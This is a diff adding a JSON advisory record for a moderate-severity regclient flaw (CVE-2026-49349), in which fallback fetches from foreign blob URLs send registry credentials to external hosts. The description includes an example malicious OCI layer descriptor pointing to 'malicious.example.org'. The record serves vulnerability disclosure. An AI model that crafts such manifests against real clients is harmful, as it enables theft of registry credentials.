@@ -1,0 +1,50 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-06-26T22:43:32Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/regclient/regclient"
+  },
+  "Advisory": {
+    "DatabaseId": 367168,
+    "Id": "GSA_kwCzR0hTQS1xdnFjLTRjNTIteDZxcM4ABZpA",
+    "GhsaId": "GHSA-qvqc-4c52-x6qp",
+    "References": [
+      {
+        "Url": "https://github.com/regclient/regclient/security/advisories/GHSA-qvqc-4c52-x6qp"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-qvqc-4c52-x6qp"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-qvqc-4c52-x6qp"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-49349"
+      }
+    ],
+    "Description": "Credentials for a registry may be inadvertently leaked to external servers. A prerequisite for this attack is a malicious registry server, a malicious blob store, or a registry that does not restrict the external URLs for foreign blobs.\n\n## Example attack\n\nA malicious registry serves an OCI image manifest containing a layer descriptor with a `urls` field pointing to an attacker controlled host:\n\n```json\n{\n  \"mediaType\": \"application/vnd.oci.image.layer.v1.tar+gzip\",\n  \"digest\": \"sha256:...\",\n  \"size\": 1024,\n  \"urls\": [\"https://malicious.example.org/blobs/sha256/...\"]\n}\n```\n\nWhen regclient fetches the image and the primary blob request to the registry fails, it falls back to the URLs in the layer descriptor. If the external server requests authentication, regclient would send the credentials for the original registry server.\n\n## Timeline\n\n- 2026-05-25: Advisory submitted\n- 2026-05-26: Fix released\n\n## Credit\n\nTheodoros Lampropoulos, Threat Detection Engineer, Odyssey Cyber Security",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-26T22:43:31Z",
+    "Severity": "MODERATE",
+    "Summary": "regclient may leak authentication credentials to external blob stores",
+    "UpdatedAt": "2026-06-26T22:43:32Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 6.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.11.5"
+      },
+      "VulnerableVersionRange": "\u003c= 0.11.4"
+    }
+  ]
+}
